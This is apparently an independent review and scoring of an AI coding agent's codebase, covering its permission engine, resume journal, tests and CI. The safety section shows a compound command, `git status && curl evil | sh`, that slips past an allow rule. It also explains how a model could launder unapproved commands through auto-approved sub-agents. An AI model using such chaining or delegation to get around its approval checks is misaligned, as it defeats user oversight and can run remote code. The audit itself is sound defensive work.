# Boundary re-review: kolega-code (independent, 2026-09-30)

Provisional: 76.5 (B), 1.5 under A floor, held at B on the 6-rung safety anchor.
License: BUSL-1.1 now, Change-License to AGPL-3.0+ at 2030-08-12 (LICENSE); census "AGPL file"
was the Change-License line misparse. Concepts-only portables enforced throughout this review.

Closest anchor: **cline** (76.5, B-ceiling plateau member) - tested binding approval with no OS
enforcement underneath, huge property-asserting CI-tested corps. Deltas: kolega has a stronger
resume journal (content-keyed vs cline's event log) and ACP, but a weaker command-rule layer and
no published SDK. Per the calibration protocol's one-sentence rule: cline's shape, Python port,
with a better workflow plane and a leakier rule matcher.

Shallow clone noted (.git/shallow); HEAD 2026-09-25, dependabot PR #696 at head, SECURITY.md
present. Activity taken as current from HEAD proximity, not inferred from history depth.

## Question 1: safety 6-vs-7 vs 5 - the compound-command rule bypass

**Mechanism, confirmed in code.** The permission engine matches allow rules against the WHOLE
command string, never per segment:

- `kolega_code/permissions.py:299-305` - `_matches_command`: `prefix` is
  `command.startswith(pattern + " ")`, `executable` is `_first_shell_token(command) == pattern`.
- `_first_shell_token` (`permissions.py:542-545`) uses `shlex.split`, which treats `&&`, `;`,
  `|` as ordinary tokens - so the "first token" of `git status && curl evil | sh` is `git`,
  and the whole compound command is admitted by an `executable: git` rule.
- Commands genuinely execute through a shell (`bash -lc`, `kolega_code/services/terminal.py:135`),
  so chaining is live, not cosmetic.
- These leaky shapes are exactly what the UI offers as always-allow options
  (`permissions.py:_command_rule_options`, prefix = first two tokens, executable = first token).
- The `executable` label promises "commands whose executable is `git`"; matching a multi-executable
  compound violates its own label. That is the bypass-of-existing-enforcement framing: an
  earned narrow grant silently governs everything chained after it. No test anywhere exercises
  `&&`/`;` against rules (grep of `tests/agent/test_permissions.py`, 495 LOC: zero compound cases).
- Prior art for the countermeasure is in-corpus and named: per-segment allow with deny-wins
  (crab-code-3, ipsupport-code-6, gemini-cli-s14 chained `&&` gating) - the `grammar-parsed-bash-policy`
  convergence. Kolega ships the naive version. (Already filed upstream as kolega-code-3; not re-filed.)

**Chokepoint audit (why not 5).** The approval chokepoint itself binds and fails closed:
- Gated dispatch path `kolega_code/agent/baseagent.py:1478-1529`: rule/store miss -> callback;
  callback raising a non-PermissionDecision or throwing returns a tool ERROR, never proceeds.
- Non-TTY ASK -> DENY (`cli/main.py:1421-1425` "Permission required, but stdin is not
  interactive"), matching gemini-cli's praised pattern (gemini-cli-s4).
- Unreadable rules file -> falls through to asking WITH a visible warning, never silent
  grant-or-deny (`session/runtime.py:204-210`).
- Interactive default is ASK (`cli/app.py:211-213`); AUTO state is color-flagged in the TUI
  (`app.py:3444`). Deny-before-dispatch is tested (`tests/agent/test_permissions.py:321`).
- Repo-shipped hooks need `--trust-hooks` and persist the trust decision (`cli/main.py:612-615`)
  - the hook-trust-scoping countermeasure is present, unlike memcode.
- No runtime false-safety indicators found; the sub-agent AUTO choice is honestly commented.

**Second hole, aggravating (new finding b1).** Sub-agents and workflow fan-out workers are
hardcoded `PermissionMode.AUTO` + `auto_allow_permission_callback`
(`agent/tool_backend/agent_tool.py:358-362`, `:865-869`) regardless of session mode, and the
delegation tools themselves are outside permission coverage (`permission_request_for_tool`,
`permissions.py:34-62` covers command/edit/mcp/message kinds only; `agent`/workflow tools return
None). A model in an ASK session can launder an unapprovable command through an unattended
sub-agent. Self-documented tradeoff (per-prompt fan-out is UX-infeasible), but there is no floor
beneath it - no deny-rule, no budget-restricted worker jail, nothing. Hermes kept 7 WITH floors
below yolo; kolega has none.

**Ruling: safety 6, hard floor, no 7 and not 5.** The compound leak is a scope defect in the
saved-rule layer that requires a user-granted broad option, and the interactive chokepoint (ask,
deny, fail-closed, non-TTY deny) is intact and tested - that is the 6 rung ("tested approval,
nothing underneath"). The same two holes that make 7 impossible (no segment analysis, no floor
under AUTO delegation) are exactly what keep it from drifting to 5 (defaults correct, errors
fail closed, no phantom controls). Bypass-of-enforcement weighting applied: it consumed the
7-headroom that "tested approval" alone would otherwise have earned, which is precisely why the
provisional 6 holds rather than rises.

## Question 2: orchestration - content-keyed resume journal, tested?

**Tested: yes, and at property level.** `agent/orchestration/journal.py` +
`tests/agent/orchestration/test_orchestration.py` (857 LOC, ~15 resume/cache tests, all unmarked
so CI-blocking):
- `cache_key` = sha1 over semantically-significant inputs only (prompt, schema, routing,
  agent/read-only type, depth; labels/phase deliberately excluded) - `types.py:44-63`.
- Content-not-position matching (`test_resume_matches_by_content_not_index:577`), identical-key
  FIFO in original ISSUE order despite completion-order journaling (`:588`), insertion-only
  runs new call (`:604`), exhausted key runs live (`:614`), failed rows never cached (`:625`),
  replayed rows re-recorded so resume-of-a-resume replays exactly (`:639,659`), None-values
  distinguishable from misses (`:675`), colliding labels after interrupt (`:685`), routing
  fingerprint changes bust the cache (`:732`).
- Budget/cap machinery is enforced and tested too: exhaustion propagates out of fan-out
  (`:334,:372`), threshold warnings fire once (`:350`), no reservation for cache hits (`:449`).

**Crash-recovery evidence: contract-level yes, kill-test no.** Journal is append-on-complete
JSONL; `load_cache` skips unparseable/truncated lines (`journal.py:229-231`) and malformed/legacy
rows are explicitly tested readable (`:838`). A mid-call kill leaves at most one torn trailing
line that is ignored. No process-kill/restart integration test exists - the kill-tolerance is
architectural, not demonstrated end-to-end.

**vs cline's 8 (teams-as-tools + durable sqlite cron + hub event journal):** kolega's journal is
the better-specified replay contract (content keys survive script edits; FIFO handles fan-out
order drift) and is more thoroughly property-tested, but cline carries a second durable surface
(cron) and hub journaling. Kolega has no queue/daemon plane (codex's 9 differentiator).
**Ruling: 8 - equals cline's rung, does not beat it.**

## Question 3: verification - what the 172k really is, what blocks in CI

Measured (wc -l, this review):
- `tests/`: 121,092 LOC, 416 `test_*.py` files. This is the real property corps: names assert
  semantics (`test_prompt_cache_stability.py`, `test_cache_breakpoints.py`,
  `test_compaction_request_budget.py`, `test_turn_cancellation.py`, resume suite above), and the
  permission suite asserts decisions, not existence (`test_execute_single_tool_denies_gated_tool_before_dispatch:321`).
- `kolega_code/_bundled_skills/`: 30,575 py LOC - of which 23,527 are the SHIPPED tool scripts
  inside the wheel (pdf_tool.py alone 8,097) and only 7,048 are smoke tests. Counting these as
  tests is inflation, third instance of `test-fixture-loc-inflation` (deepagents, auto-code-rover) -
  here it is bundled-package-data inflation.
- `benchmarks/`: 13,578 py+json LOC including vendored dependency snapshot trees
  (e.g. `benchmarks/edit_tools/fixtures/snapshots/click-b67832c2167e/tree/src/click/types.py`) -
  generated/vendored accounting rule: zero credit.
- Real test mass ~= 121k, not 172k (+~3-5k genuine smoke). The corps is still cline/pi-shaped.

**What blocks in CI** (`.github/workflows/ci.yml`):
- Blocking on every PR/push: pre-commit (`:108-110`), then `./run_tests.sh` on the 4-Python
  matrix (`:114-121`) - which is pytest `-m "not slow"` (`run_tests.sh:57`) - plus coverage
  `--cov-fail-under=45` on 3.11 (`run_tests.sh:12`), and CodeQL (separate workflow).
  Tests genuinely block.
- NEVER run in any workflow: `slow`/`integration`-marked suites (`--all` appears in no workflow;
  grep for them in `.github/workflows/*.yml` returns nothing). Eval work = a lockfile-audit
  step (`ci.yml:237-251`), not model evaluation.
- No model evals in CI, no fuzzing anywhere -> ERRATA verification-8 ceiling applies; 9 not
  available on any reading. The unrun slow tier docks nothing from 8 (fast suite is the bulk)
  but is recorded (finding b4) and would sink a thinner subject.

**Ruling: verification 8, ceiling-confirmed.** The 172k figure is inflated ~40%; the inflation
does not change the rung because the genuine 121k corps matches the anchors' 8-rung shape, and
CI blocks on it. Had the corpus depended on the inflated mass, this would have been a 7.

## Sanity pass, remaining lanes (independent)

- architecture 7.5: errata >5k-LOC product check PASSES (largest product files: `cli/app.py`
  3,526, `agent/baseagent.py` 3,001, `cli/main.py` 2,927; the 8k pdf/docx/xlsx files are bundled
  skill package data - zero blame under the vendored rule). Clean plane separation
  (acp/gateway/orchestration/llm), but BaseAgent fuses loop + dispatch + permission + hooks +
  history in 3k LOC, crush-shaped. 7.5, not 8.
- token-economy 7.5: threshold compaction (0.8, non-destructive, `agent/compression.py:151-177`),
  token-cost-aware transcript rendering (compression.py:36-40 comment: JSON-escaping costs ~30%),
  real cache-breakpoint control (`llm/models.py:163-141,239-241`) with dedicated tests
  (`test_cache_breakpoints.py`, `test_prompt_cache_stability.py`) - jazz-cluster discipline.
  No measured/projected-context trigger (pi), no tiers (codex). 7.5.
- interop 7: ACP server + MCP client with verify-state workflow (`cli/main.py:769-822`),
  gateway daemon/control relay (`kolega_code/gateway/`), headless `ask` with validated ATIF v1.7
  trajectory export (`cli/main.py:595-602`), browser extension. No published SDK, no JetBrains
  surface -> below cline's 8.
- operability 8: sessions store + continue-from-history + rewind (`tests/cli/test_app_rewind.py`),
  worktree switching, doctor, `faulthandler.enable()` at entry (`cli/main.py:177-180`), crash
  log secret-redaction (`cli/main.py:1395-1407`). crush/cline rung.
- originality 7: content-keyed FIFO resume journal (workflow-resume-journal convergence, x13,
  best occupant on contract rigor), in-process js/py eval kernels (`agent/eval/`), ATIF trajectory
  output, peer-session messaging with its own permission kind. Nothing codex-9 singular.
- durability 5: pre-1.0, SECURITY.md with private disclosure, org CI + dependabot + release
  workflow; shallow clone -> bus factor unverifiable (recorded, not scored against).
- docs-dx 7: astro docs site in-tree, README/CONTRIBUTING/MIGRATION/RELEASING/SECURITY,
  how-gigacode-works.md. No SECURITY gap; below pi's 9 density.

## Totals

architecture 7.5*1.5 + verification 8*1.5 + safety 6 + token 7.5 + orchestration 8 + interop 7
+ operability 8 + originality 7 + durability 5*.5 + docs 7*.5
= 11.25 + 12 + 6 + 7.5 + 8 + 7 + 8 + 7 + 2.5 + 3.5 = **72.75 / B**

vs provisional 76.5: the recount lands 3.75 lower (token-economy and interop credited at corpus
rung rather than plateau-ceiling generosity; durability 5 with no remote corroboration). Band
identical either way; A floor NOT crossed even on the lenient bound - the max any contested
lane could add without new evidence (orchestration 9: -2.0 needed for codex-plane queue;
verification 9: forbidden by ERRATA) is unreachable. B-ceiling plateau membership: kolega is
mid-B, not ceiling, on this recount.

Calibration rules: no fork/lineage (provenance original, kolega-ai org); rule (b) not triggered
(HEAD 5 days old at review); no demotion/promotion against census tier - this is a straight
merit recount inside band B. Distribution unchanged.
